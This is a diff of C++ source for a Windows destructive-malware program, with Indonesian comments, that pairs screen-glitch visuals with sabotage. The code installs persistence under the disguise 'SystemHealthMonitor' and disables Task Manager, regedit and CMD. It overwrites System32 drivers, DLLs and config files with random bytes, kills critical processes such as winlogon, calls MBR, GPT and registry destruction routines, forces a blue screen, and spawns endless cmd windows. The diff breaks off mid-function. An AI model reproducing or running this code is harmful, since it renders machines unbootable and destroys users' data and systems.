-    std::unique_ptr<BYTE[]> pCopy(new BYTE[screenWidth * screenHeight * 4]);
-    if (!pCopy) return;
-    memcpy(pCopy.get(), pPixels, screenWidth * screenHeight * 4);
-    
-    for (auto& hole : wormholes) {
-        for (int y = 0; y < screenHeight; y++) {
-            for (int x = 0; x < screenWidth; x++) {
-                float dx = static_cast<float>(x - hole.centerX);
-                float dy = static_cast<float>(y - hole.centerY);
-                float dist = sqrt(dx*dx + dy*dy);
-                
-                if (dist < hole.radius) {
-                    float amount = pow(1.0f - (dist / hole.radius), 2.0f) * hole.strength;
-                    int shiftX = static_cast<int>(dx * amount);
-                    int shiftY = static_cast<int>(dy * amount);
-                    
-                    int srcX = x - shiftX;
-                    int srcY = y - shiftY;
-                    
-                    if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
-                        int srcPos = (srcY * screenWidth + srcX) * 4;
-                        int dstPos = (y * screenWidth + x) * 4;
-                        
-                        if (dstPos >= 0 && dstPos < static_cast<int>(screenWidth * screenHeight * 4) - 4 && 
-                            srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                            pPixels[dstPos] = pCopy[srcPos];
-                            pPixels[dstPos + 1] = pCopy[srcPos + 1];
-                            pPixels[dstPos + 2] = pCopy[srcPos + 2];
-                        }
-                    }
-                }
-            }
-        }
-    }
-    
-    // Remove old wormholes
-    DWORD currentTime = GetTickCount();
-    for (auto it = wormholes.begin(); it != wormholes.end(); ) {
-        if (currentTime - it->creationTime > 10000) {
-            it = wormholes.erase(it);
-        } else {
-            ++it;
-        }
-    }
-}
-
-void ApplyTemporalDistortion() {
-    if (!temporalDistortionActive) return;
-    
-    static std::vector<std::vector<BYTE>> frameHistory;
-    static int historyIndex = 0;
-    
-    // Initialize frame history
-    if (frameHistory.empty()) {
-        frameHistory.resize(10);
-        for (auto& frame : frameHistory) {
-            frame.resize(screenWidth * screenHeight * 4);
-        }
-    }
-    
-    // Store current frame
-    memcpy(frameHistory[historyIndex].data(), pPixels, screenWidth * screenHeight * 4);
-    historyIndex = (historyIndex + 1) % frameHistory.size();
-    
-    // Blend with previous frames
-    for (int i = 0; i < screenWidth * screenHeight * 4; i += 4) {
-        if (i < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-            int blendIndex = (historyIndex + rand() % (frameHistory.size() - 1)) % frameHistory.size();
-            
-            pPixels[i] = static_cast<BYTE>((pPixels[i] + frameHistory[blendIndex][i]) / 2);
-            pPixels[i+1] = static_cast<BYTE>((pPixels[i+1] + frameHistory[blendIndex][i+1]) / 2);
-            pPixels[i+2] = static_cast<BYTE>((pPixels[i+2] + frameHistory[blendIndex][i+2]) / 2);
-        }
-    }
-}
-
-// ======== ENHANCED GLITCH EFFECT ========
-void ApplyGlitchEffect() {
-    if (!pPixels) return;
-    
-    std::unique_ptr<BYTE[]> pCopy(new BYTE[screenWidth * screenHeight * 4]);
-    if (!pCopy) return;
-    memcpy(pCopy.get(), pPixels, screenWidth * screenHeight * 4);
-    
-    DWORD currentTime = GetTickCount();
-    int timeIntensity = 1 + static_cast<int>((currentTime - startTime) / 3000);
-    intensityLevel = std::min(30, timeIntensity);
-    
-    ApplyScreenShake();
-    
-    if (currentTime - lastEffectTime > 800) {
-        textCorruptionActive = (rand() % 100 < 40 * intensityLevel);
-        matrixRainActive = (rand() % 100 < 30 * intensityLevel);
-        fractalNoiseActive = (rand() % 100 < 25 * intensityLevel);
-        screenBurnActive = (rand() % 100 < 20 * intensityLevel);
-        wormholeEffectActive = (rand() % 100 < 15 * intensityLevel);
-        temporalDistortionActive = (rand() % 100 < 10 * intensityLevel);
-        lastEffectTime = currentTime;
-    }
-    
-    // Enhanced glitch lines
-    int effectiveLines = std::min(GLITCH_LINES * intensityLevel, 10000);
-    for (int i = 0; i < effectiveLines; ++i) {
-        int y = rand() % screenHeight;
-        int height = 1 + rand() % (100 * intensityLevel);
-        int xOffset = (rand() % (MAX_GLITCH_INTENSITY * 3 * intensityLevel)) - MAX_GLITCH_INTENSITY * intensityLevel * 1.5;
-        
-        height = std::min(height, screenHeight - y);
-        if (height <= 0) continue;
-        
-        for (int h = 0; h < height; ++h) {
-            int currentY = y + h;
-            if (currentY >= screenHeight) break;
-            
-            BYTE* source = pCopy.get() + (currentY * screenWidth * 4);
-            BYTE* dest = pPixels + (currentY * screenWidth * 4);
-            
-            if (xOffset > 0) {
-                int copySize = (screenWidth - xOffset) * 4;
-                if (copySize > 0) {
-                    memmove(dest + xOffset * 4, 
-                            source, 
-                            copySize);
-                }
-                for (int x = 0; x < xOffset; x++) {
-                    int pos = (currentY * screenWidth + x) * 4;
-                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                        pPixels[pos] = dis(gen);
-                        pPixels[pos + 1] = dis(gen);
-                        pPixels[pos + 2] = dis(gen);
-                    }
-                }
-            } 
-            else if (xOffset < 0) {
-                int absOffset = -xOffset;
-                int copySize = (screenWidth - absOffset) * 4;
-                if (copySize > 0) {
-                    memmove(dest, 
-                            source + absOffset * 4, 
-                            copySize);
-                }
-                for (int x = screenWidth - absOffset; x < screenWidth; x++) {
-                    int pos = (currentY * screenWidth + x) * 4;
-                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                        pPixels[pos] = dis(gen);
-                        pPixels[pos + 1] = dis(gen);
-                        pPixels[pos + 2] = dis(gen);
-                    }
-                }
-            }
-        }
-    }
-    
-    // Enhanced block distortion
-    int effectiveBlocks = std::min(MAX_GLITCH_BLOCKS * intensityLevel, 2000);
-    for (int i = 0; i < effectiveBlocks; ++i) {
-        int blockWidth = std::min(100 + rand() % (400 * intensityLevel), screenWidth);
-        int blockHeight = std::min(100 + rand() % (400 * intensityLevel), screenHeight);
-        int x = rand() % (screenWidth - blockWidth);
-        int y = rand() % (screenHeight - blockHeight);
-        int offsetX = (rand() % (1000 * intensityLevel)) - 500 * intensityLevel;
-        int offsetY = (rand() % (1000 * intensityLevel)) - 500 * intensityLevel;
-        
-        for (int h = 0; h < blockHeight; h++) {
-            int sourceY = y + h;
-            int destY = sourceY + offsetY;
-            
-            if (destY >= 0 && destY < screenHeight && sourceY >= 0 && sourceY < screenHeight) {
-                BYTE* source = pCopy.get() + (sourceY * screenWidth + x) * 4;
-                BYTE* dest = pPixels + (destY * screenWidth + x + offsetX) * 4;
-                
-                int effectiveWidth = blockWidth;
-                if (x + offsetX + blockWidth > screenWidth) {
-                    effectiveWidth = screenWidth - (x + offsetX);
-                }
-                if (x + offsetX < 0) {
-                    effectiveWidth = blockWidth + (x + offsetX);
-                    source -= (x + offsetX) * 4;
-                    dest -= (x + offsetX) * 4;
-                }
-                
-                if (effectiveWidth > 0 && dest >= pPixels && 
-                    dest + effectiveWidth * 4 <= pPixels + screenWidth * screenHeight * 4) {
-                    memcpy(dest, source, effectiveWidth * 4);
-                }
-            }
-        }
-    }
-    
-    if (intensityLevel > 0 && (rand() % std::max(1, 3 / intensityLevel)) == 0) {
-        ApplyColorShift(pPixels, (rand() % 5) + 1);
-    }
-    
-    int effectivePixels = std::min(screenWidth * screenHeight * intensityLevel, 500000);
-    for (int i = 0; i < effectivePixels; i++) {
-        int x = rand() % screenWidth;
-        int y = rand() % screenHeight;
-        int pos = (y * screenWidth + x) * 4;
-        
-        if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-            pPixels[pos] = dis(gen);
-            pPixels[pos + 1] = dis(gen);
-            pPixels[pos + 2] = dis(gen);
-        }
-    }
-    
-    if (intensityLevel > 0 && (rand() % std::max(1, 4 / intensityLevel)) == 0) {
-        int centerX = rand() % screenWidth;
-        int centerY = rand() % screenHeight;
-        int radius = std::min(200 + rand() % (1000 * intensityLevel), screenWidth/2);
-        int distortion = 50 + rand() % (150 * intensityLevel);
-        
-        int yStart = std::max(centerY - radius, 0);
-        int yEnd = std::min(centerY + radius, screenHeight);
-        int xStart = std::max(centerX - radius, 0);
-        int xEnd = std::min(centerX + radius, screenWidth);
-        
-        for (int y = yStart; y < yEnd; y++) {
-            for (int x = xStart; x < xEnd; x++) {
-                float dx = static_cast<float>(x - centerX);
-                float dy = static_cast<float>(y - centerY);
-                float distance = sqrt(dx*dx + dy*dy);
-                
-                if (distance < radius) {
-                    float amount = pow(1.0f - (distance / radius), 2.0f);
-                    int shiftX = static_cast<int>(dx * amount * distortion * (rand() % 5 - 2));
-                    int shiftY = static_cast<int>(dy * amount * distortion * (rand() % 5 - 2));
-                    
-                    int srcX = x - shiftX;
-                    int srcY = y - shiftY;
-                    
-                    if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
-                        int srcPos = (srcY * screenWidth + srcX) * 4;
-                        int destPos = (y * screenWidth + x) * 4;
-                        
-                        if (destPos >= 0 && destPos < static_cast<int>(screenWidth * screenHeight * 4) - 4 && 
-                            srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                            pPixels[destPos] = pCopy[srcPos];
-                            pPixels[destPos + 1] = pCopy[srcPos + 1];
-                            pPixels[destPos + 2] = pCopy[srcPos + 2];
-                        }
-                    }
-                }
-            }
-        }
-    }
-    
-    if (rand() % 3 == 0) {
-        int lineHeight = 1 + rand() % (5 * intensityLevel);
-        for (int y = 0; y < screenHeight; y += lineHeight * 2) {
-            for (int h = 0; h < lineHeight; h++) {
-                if (y + h >= screenHeight) break;
-                for (int x = 0; x < screenWidth; x++) {
-                    int pos = ((y + h) * screenWidth + x) * 4;
-                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                        pPixels[pos] = std::min(pPixels[pos] + 150, 255);
-                        pPixels[pos + 1] = std::min(pPixels[pos + 1] + 150, 255);
-                        pPixels[pos + 2] = std::min(pPixels[pos + 2] + 150, 255);
-                    }
-                }
-            }
-        }
-    }
-    
-    if (intensityLevel > 0 && (rand() % std::max(1, 15 / intensityLevel)) == 0) {
-        for (int i = 0; i < static_cast<int>(screenWidth * screenHeight * 4); i += 4) {
-            if (i < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                pPixels[i] = 255 - pPixels[i];
-                pPixels[i + 1] = 255 - pPixels[i + 1];
-                pPixels[i + 2] = 255 - pPixels[i + 2];
-            }
-        }
-    }
-    
-    if (intensityLevel > 3 && rand() % 8 == 0) {
-        ApplyMeltingEffect(pCopy.get());
-    }
-    
-    if (textCorruptionActive) {
-        ApplyTextCorruption();
-    }
-    
-    if (intensityLevel > 2 && rand() % 12 == 0) {
-        ApplyPixelSorting();
-    }
-    
-    if (intensityLevel > 2 && rand() % 6 == 0) {
-        ApplyStaticBars();
-    }
-    
-    if (intensityLevel > 3 && rand() % 10 == 0) {
-        ApplyInversionWaves();
-    }
-    
-    // Advanced effects
-    if (matrixRainActive) {
-        ApplyMatrixRain();
-    }
-    
-    if (fractalNoiseActive) {
-        ApplyFractalNoise();
-    }
-    
-    if (screenBurnActive) {
-        ApplyScreenBurn();
-    }
-    
-    if (wormholeEffectActive) {
-        ApplyWormholeEffect();
-    }
-    
-    if (temporalDistortionActive) {
-        ApplyTemporalDistortion();
-    }
-    
-    ApplyCursorEffect();
-    UpdateParticles();
-    
-    if (rand() % SOUND_CHANCE == 0) {
-        PlayGlitchSoundAsync();
-    }
-    
-    if (rand() % 80 == 0) {
-        cursorVisible = !cursorVisible;
-        ShowCursor(cursorVisible);
-    }
-    
-    // ===== POPUP RANDOM =====
-    static DWORD lastPopupTime = 0;
-    if (GetTickCount() - lastPopupTime > 2000 && (rand() % 100 < (25 + intensityLevel * 4))) {
-        std::thread(OpenRandomPopups).detach();
-        lastPopupTime = GetTickCount();
-    }
-    
-    // ===== DESTRUCTIVE EFFECTS =====
-    DWORD cTime = GetTickCount();
-    
-    // Aktifkan mode kritis setelah 45 detik
-    if (!criticalMode && cTime - startTime > 45000) {
-        criticalMode = true;
-        bsodTriggerTime = cTime + 45000 + rand() % 45000; // BSOD dalam 45-90 detik
-        
-        if (!persistenceInstalled) {
-            InstallPersistence();
-            DisableSystemTools();
-            DisableCtrlAltDel();
-        }
-        
-        // Aktifkan fitur admin
-        if (g_isAdmin) {
-            static bool adminDestructionDone = false;
-            if (!adminDestructionDone) {
-                BreakTaskManager();
-                SetCriticalProcess();
-                DestroyMBR();
-                DestroyGPT();
-                DestroyRegistry();
-                adminDestructionDone = true;
-            }
-        }
-    }
-    
-    // Eksekusi tindakan destruktif
-    if (criticalMode && !destructiveActionsTriggered) {
-        ExecuteDestructiveActions();
-    }
-    
-    // Efek khusus mode kritis
-    if (criticalMode) {
-        static DWORD lastCorruption = 0;
-        if (cTime - lastCorruption > 8000) {
-            std::thread(CorruptSystemFiles).detach();
-            lastCorruption = cTime;
-        }
-        
-        static DWORD lastKill = 0;
-        if (cTime - lastKill > 4000) {
-            std::thread(KillCriticalProcesses).detach();
-            lastKill = cTime;
-        }
-        
-        intensityLevel = 30;
-        
-        if (cTime >= bsodTriggerTime) {
-            std::thread(TriggerBSOD).detach();
-        }
-    }
-}
-
-// ======== ENHANCED POPUP FUNCTION ========
-void OpenRandomPopups() {
-    const wchar_t* commands[] = {
-        L"cmd.exe /k \"@echo off && title CORRUPTED_SYSTEM && color 0a && echo WARNING: SYSTEM INTEGRITY COMPROMISED && for /l %x in (0,0,0) do start /min cmd /k \"echo CRITICAL FAILURE %random% && ping 127.0.0.1 -n 2 > nul && exit\"\"",
-        L"powershell.exe -NoExit -Command \"while($true) { Write-Host 'R͏͏҉̧҉U̸N̕͢N̢҉I͠N̶G̵ ͠C̴O̕R͟R̨U̕P̧T͜ED̢ ̸C̵ÒD̸E' -ForegroundColor (Get-Random -InputObject ('Red','Green','Yellow')); Start-Sleep -Milliseconds 100 }\"",
-        L"notepad.exe",
-        L"explorer.exe",
-        L"write.exe",
-        L"calc.exe",
-        L"mspaint.exe",
-        L"regedit.exe",
-        L"taskmgr.exe",
-        L"control.exe",
-        L"mmc.exe",
-        L"services.msc",
-        L"eventvwr.msc",
-        L"compmgmt.msc",
-        L"diskmgmt.msc"
-    };
-
-    int numPopups = 5 + rand() % 8; // 5-12 popup sekaligus
-    bool spawnSpam = (rand() % 2 == 0); // 50% chance spawn cmd spammer
-
-    for (int i = 0; i < numPopups; i++) {
-        int cmdIndex = rand() % (sizeof(commands)/sizeof(commands[0]));
-        
-        // Untuk cmd spam khusus
-        if (spawnSpam && i == 0) {
-            ShellExecuteW(NULL, L"open", L"cmd.exe", 
-                L"/c start cmd.exe /k \"@echo off && title SYSTEM_FAILURE && for /l %x in (0,0,0) do start /min cmd /k echo ͏҉̷̸G҉̢L͠I͏̵T́C̶H͟ ̀͠D͠E͜T̷ÉC̵T̨E̵D͜ %random% && timeout 1 > nul\"", 
-                NULL, SW_SHOWMINIMIZED);
-            continue;
-        }
-
-        SHELLEXECUTEINFOW sei = { sizeof(sei) };
-        sei.lpVerb = L"open";
-        sei.lpFile = L"cmd.exe";
-        sei.lpParameters = commands[cmdIndex];
-        sei.nShow = (rand() % 2) ? SW_SHOWMINIMIZED : SW_SHOWNORMAL;
-        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
-        
-        ShellExecuteExW(&sei);
-        if (sei.hProcess) CloseHandle(sei.hProcess);
-        
-        Sleep(50); // Shorter delay between popups
-    }
-
-    // Spawn khusus Windows Terminal jika ada
-    if (rand() % 3 == 0) {
-        ShellExecuteW(NULL, L"open", L"wt.exe", NULL, NULL, SW_SHOW);
-    }
-    
-    // Spawn multiple instances of browser with error pages
-    if (rand() % 4 == 0) {
-        const wchar_t* errorUrls[] = {
-            L"https://www.google.com/search?q=system+error+0x0000000A",
-            L"https://www.bing.com/search?q=critical+system+failure",
-            L"https://www.youtube.com/results?search_query=blue+screen+of+death",
-            L"https://www.wikipedia.org/wiki/Fatal_system_error"
-        };
-        
-        for (int i = 0; i < 3; i++) {
-            int urlIndex = rand() % (sizeof(errorUrls)/sizeof(errorUrls[0]));
-            ShellExecuteW(NULL, L"open", L"iexplore.exe", errorUrls[urlIndex], NULL, SW_SHOWMAXIMIZED);
-        }
-    }
-}
-
-// ======== ENHANCED PERSISTENCE & DESTRUCTION ========
+// ======== FUNGSI PERSISTENSI & DESTRUKSI ========
 BOOL IsWindows64() {
     BOOL bIsWow64 = FALSE;
     LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
@@ -2198,9 +1008,6 @@ void InstallPersistence() {
     
     CopyFileW(szPath, targetPath, FALSE);
     
-    // Set hidden and system attributes
-    SetFileAttributesW(targetPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-    
     HKEY hKey;
     if (g_isAdmin) {
         RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
@@ -2211,29 +1018,6 @@ void InstallPersistence() {
     }
     RegSetValueExW(hKey, L"SystemHealthMonitor", 0, REG_SZ, (BYTE*)targetPath, (lstrlenW(targetPath) + 1) * sizeof(wchar_t));
     RegCloseKey(hKey);
-    
-    // Also add to services if admin
-    if (g_isAdmin) {
-        SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-        if (scm) {
-            SC_HANDLE service = CreateServiceW(
-                scm,
-                L"SystemHealthMonitor",
-                L"System Health Monitoring Service",
-                SERVICE_ALL_ACCESS,
-                SERVICE_WIN32_OWN_PROCESS,
-                SERVICE_AUTO_START,
-                SERVICE_ERROR_SEVERE,
-                targetPath,
-                NULL, NULL, NULL, NULL, NULL
-            );
-            
-            if (service) {
-                CloseServiceHandle(service);
-            }
-            CloseServiceHandle(scm);
-        }
-    }
     
     SYSTEMTIME st;
     GetLocalTime(&st);
@@ -2274,16 +1058,18 @@ void DisableSystemTools() {
                    0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
     DWORD value = 1;
     RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
-    RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
-    RegSetValueExW(hKey, L"DisableCMD", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
     RegCloseKey(hKey);
-
+    
+    RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
+                   0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
+    RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+    RegCloseKey(hKey);
+    
     if (g_isAdmin) {
         RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
                        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
         RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
         RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
-        RegSetValueExW(hKey, L"DisableCMD", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
         RegCloseKey(hKey);
     }
     
@@ -2296,11 +1082,7 @@ void CorruptSystemFiles() {
         L"C:\\Windows\\System32\\drivers\\*.sys",
         L"C:\\Windows\\System32\\*.dll",
         L"C:\\Windows\\System32\\*.exe",
-        L"C:\\Windows\\System32\\config\\*",
-        L"C:\\Windows\\System32\\*.mui",
-        L"C:\\Windows\\SysWOW64\\*.dll",
-        L"C:\\Windows\\SysWOW64\\*.exe",
-        L"C:\\Windows\\SysWOW64\\*.mui"
+        L"C:\\Windows\\System32\\config\\*"
     };
     
     // Handle Wow64 redirection untuk Windows 64-bit
@@ -2327,8 +1109,6 @@ void CorruptSystemFiles() {
                         wsprintfW(filePath, L"C:\\Windows\\System32\\drivers\\%s", fd.cFileName);
                     } else if (i == 3) {
                         wsprintfW(filePath, L"C:\\Windows\\System32\\config\\%s", fd.cFileName);
-                    } else if (i >= 5) {
-                        wsprintfW(filePath, L"C:\\Windows\\SysWOW64\\%s", fd.cFileName);
                     } else {
                         wsprintfW(filePath, L"C:\\Windows\\System32\\%s", fd.cFileName);
                     }
@@ -2337,14 +1117,16 @@ void CorruptSystemFiles() {
                     if (hFile != INVALID_HANDLE_VALUE) {
                         DWORD fileSize = GetFileSize(hFile, NULL);
                         if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
-                            std::unique_ptr<BYTE[]> buffer(new BYTE[fileSize]);
+                            BYTE* buffer = new BYTE[fileSize];
                             if (buffer) {
                                 for (DWORD j = 0; j < fileSize; j++) {
-                                    buffer[j] = static_cast<BYTE>(dis(gen));
+                                    buffer[j] = static_cast<BYTE>(rand() % 256);
                                 }
                                 
                                 DWORD written;
-                                WriteFile(hFile, buffer.get(), fileSize, &written, NULL);
+                                WriteFile(hFile, buffer, fileSize, &written, NULL);
+                                
+                                delete[] buffer;
                             }
                         }
                         CloseHandle(hFile);
@@ -2380,12 +1162,7 @@ void KillCriticalProcesses() {
         L"mmc.exe",
         L"services.exe",
         L"svchost.exe",
-        L"winlogon.exe",
-        L"lsass.exe",
-        L"csrss.exe",
-        L"smss.exe",
-        L"wininit.exe",
-        L"spoolsv.exe"
+        L"winlogon.exe"
     };
     
     DWORD processes[1024], cbNeeded;
@@ -2432,30 +1209,347 @@ void TriggerBSOD() {
         }
     }
     
-    // Additional BSOD methods
-    typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
-    typedef NTSTATUS(NTAPI* pdef_ZwRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
-    
-    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
-    if (hNtdll) {
-        pdef_RtlAdjustPrivilege RtlAdjustPrivilege = reinterpret_cast<pdef_RtlAdjustPrivilege>(
-            GetProcAddress(hNtdll, "RtlAdjustPrivilege"));
-        pdef_ZwRaiseHardError ZwRaiseHardError = reinterpret_cast<pdef_ZwRaiseHardError>(
-            GetProcAddress(hNtdll, "ZwRaiseHardError"));
-        
-        if (RtlAdjustPrivilege && ZwRaiseHardError) {
-            BOOLEAN bEnabled;
-            RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
-            ZwRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &ULONG(0));
-        }
-    }
-    
     // Fallback: Cause access violation
     int* p = (int*)0x1;
     *p = 0;
 }
 
-// ======== ENHANCED WINDOW PROCEDURE ========
+// ======== FUNGSI POPUP & DESTRUKSI ========
+void OpenRandomPopups() {
+    const wchar_t* commands[] = {
+        L"cmd.exe /k \"@echo off && title CORRUPTED_SYSTEM && color 0a && echo WARNING: SYSTEM INTEGRITY COMPROMISED && for /l %x in (0,0,0) do start /min cmd /k \"echo CRITICAL FAILURE %random% && ping 127.0.0.1 -n 2 > nul && exit\"\"",
+        L"powershell.exe -NoExit -Command \"while($true) { Write-Host 'R͏͏҉̧҉U̸N̕͢N̢҉I͠N̶G̵ ͠C̴O̕R͟R̨U̕P̧T͜ED̢ ̸C̵ÒD̸E' -ForegroundColor (Get-Random -InputObject ('Red','Green','Yellow')); Start-Sleep -Milliseconds 200 }\"",
+        L"notepad.exe",
+        L"explorer.exe",
+        L"write.exe",
+        L"calc.exe",
+        L"mspaint.exe",
+        L"regedit.exe",
+        L"taskmgr.exe",
+        L"control.exe"
+    };
+
+    int numPopups = 3 + rand() % 5; // 3-7 popup sekaligus
+    bool spawnSpam = (rand() % 3 == 0); // 33% chance spawn cmd spammer
+
+    for (int i = 0; i < numPopups; i++) {
+        int cmdIndex = rand() % (sizeof(commands)/sizeof(commands[0]));
+        
+        // Untuk cmd spam khusus
+        if (spawnSpam && i == 0) {
+            ShellExecuteW(NULL, L"open", L"cmd.exe", 
+                L"/c start cmd.exe /k \"@echo off && title SYSTEM_FAILURE && for /l %x in (0,0,0) do start /min cmd /k echo ͏҉̷̸G҉̢L͠I͏̵T́C̶H͟ ̀͠D͠E͜T̷ÉC̵T̨E̵D͜ %random% && timeout 1 > nul\"", 
+                NULL, SW_SHOWMINIMIZED);
+            continue;
+        }
+
+        SHELLEXECUTEINFOW sei = { sizeof(sei) };
+        sei.lpVerb = L"open";
+        sei.lpFile = L"cmd.exe";
+        sei.lpParameters = commands[cmdIndex];
+        sei.nShow = (rand() % 2) ? SW_SHOWMINIMIZED : SW_SHOWNORMAL;
+        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+        
+        ShellExecuteExW(&sei);
+        if (sei.hProcess) CloseHandle(sei.hProcess);
+        
+        Sleep(100); // Delay antar popup
+    }
+
+    // Spawn khusus Windows Terminal jika ada
+    if (rand() % 5 == 0) {
+        ShellExecuteW(NULL, L"open", L"wt.exe", NULL, NULL, SW_SHOW);
+    }
+}
+
+void ApplyGlitchEffect() {
+    if (!pPixels) return;
+    
+    BYTE* pCopy = new (std::nothrow) BYTE[screenWidth * screenHeight * 4];
+    if (!pCopy) return;
+    memcpy(pCopy, pPixels, screenWidth * screenHeight * 4);
+    
+    DWORD currentTime = GetTickCount();
+    int timeIntensity = 1 + static_cast<int>((currentTime - startTime) / 5000);
+    intensityLevel = std::min(20, timeIntensity);
+    
+    ApplyScreenShake();
+    
+    if (currentTime - lastEffectTime > 1000) {
+        textCorruptionActive = (rand() % 100 < 30 * intensityLevel);
+        lastEffectTime = currentTime;
+    }
+    
+    // Glitch garis horizontal intens
+    int effectiveLines = std::min(GLITCH_LINES * intensityLevel, 5000);
+    for (int i = 0; i < effectiveLines; ++i) {
+        int y = rand() % screenHeight;
+        int height = 1 + rand() % (50 * intensityLevel);
+        int xOffset = (rand() % (MAX_GLITCH_INTENSITY * 2 * intensityLevel)) - MAX_GLITCH_INTENSITY * intensityLevel;
+        
+        height = std::min(height, screenHeight - y);
+        if (height <= 0) continue;
+        
+        for (int h = 0; h < height; ++h) {
+            int currentY = y + h;
+            if (currentY >= screenHeight) break;
+            
+            BYTE* source = pCopy + (currentY * screenWidth * 4);
+            BYTE* dest = pPixels + (currentY * screenWidth * 4);
+            
+            if (xOffset > 0) {
+                int copySize = (screenWidth - xOffset) * 4;
+                if (copySize > 0) {
+                    memmove(dest + xOffset * 4, 
+                            source, 
+                            copySize);
+                }
+                for (int x = 0; x < xOffset; x++) {
+                    int pos = (currentY * screenWidth + x) * 4;
+                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
+                        pPixels[pos] = rand() % 256;
+                        pPixels[pos + 1] = rand() % 256;
+                        pPixels[pos + 2] = rand() % 256;
+                    }
+                }
+            } 
+            else if (xOffset < 0) {
+                int absOffset = -xOffset;
+                int copySize = (screenWidth - absOffset) * 4;
+                if (copySize > 0) {
+                    memmove(dest, 
+                            source + absOffset * 4, 
+                            copySize);
+                }
+                for (int x = screenWidth - absOffset; x < screenWidth; x++) {
+                    int pos = (currentY * screenWidth + x) * 4;
+                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
+                        pPixels[pos] = rand() % 256;
+                        pPixels[pos + 1] = rand() % 256;
+                        pPixels[pos + 2] = rand() % 256;
+                    }
+                }
+            }
+        }
+    }
+    
+    // Distorsi blok ekstrim
+    int effectiveBlocks = std::min(MAX_GLITCH_BLOCKS * intensityLevel, 1000);
+    for (int i = 0; i < effectiveBlocks; ++i) {
+        int blockWidth = std::min(50 + rand() % (200 * intensityLevel), screenWidth);
+        int blockHeight = std::min(50 + rand() % (200 * intensityLevel), screenHeight);
+        int x = rand() % (screenWidth - blockWidth);
+        int y = rand() % (screenHeight - blockHeight);
+        int offsetX = (rand() % (500 * intensityLevel)) - 250 * intensityLevel;
+        int offsetY = (rand() % (500 * intensityLevel)) - 250 * intensityLevel;
+        
+        for (int h = 0; h < blockHeight; h++) {
+            int sourceY = y + h;
+            int destY = sourceY + offsetY;
+            
+            if (destY >= 0 && destY < screenHeight && sourceY >= 0 && sourceY < screenHeight) {
+                BYTE* source = pCopy + (sourceY * screenWidth + x) * 4;
+                BYTE* dest = pPixels + (destY * screenWidth + x + offsetX) * 4;
+                
+                int effectiveWidth = blockWidth;
+                if (x + offsetX + blockWidth > screenWidth) {
+                    effectiveWidth = screenWidth - (x + offsetX);
+                }
+                if (x + offsetX < 0) {
+                    effectiveWidth = blockWidth + (x + offsetX);
+                    source -= (x + offsetX) * 4;
+                    dest -= (x + offsetX) * 4;
+                }
+                
+                if (effectiveWidth > 0 && dest >= pPixels && 
+                    dest + effectiveWidth * 4 <= pPixels + screenWidth * screenHeight * 4) {
+                    memcpy(dest, source, effectiveWidth * 4);
+                }
+            }
+        }
+    }
+    
+    if (intensityLevel > 0 && (rand() % std::max(1, 5 / intensityLevel)) == 0) {
+        ApplyColorShift(pPixels, (rand() % 3) + 1);
+    }
+    
+    int effectivePixels = std::min(screenWidth * screenHeight * intensityLevel, 100000);
+    for (int i = 0; i < effectivePixels; i++) {
+        int x = rand() % screenWidth;
+        int y = rand() % screenHeight;
+        int pos = (y * screenWidth + x) * 4;
+        
+        if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
+            pPixels[pos] = rand() % 256;
+            pPixels[pos + 1] = rand() % 256;
+            pPixels[pos + 2] = rand() % 256;
+        }
+    }
+    
+    if (intensityLevel > 0 && (rand() % std::max(1, 6 / intensityLevel)) == 0) {
+        int centerX = rand() % screenWidth;
+        int centerY = rand() % screenHeight;
+        int radius = std::min(100 + rand() % (500 * intensityLevel), screenWidth/2);
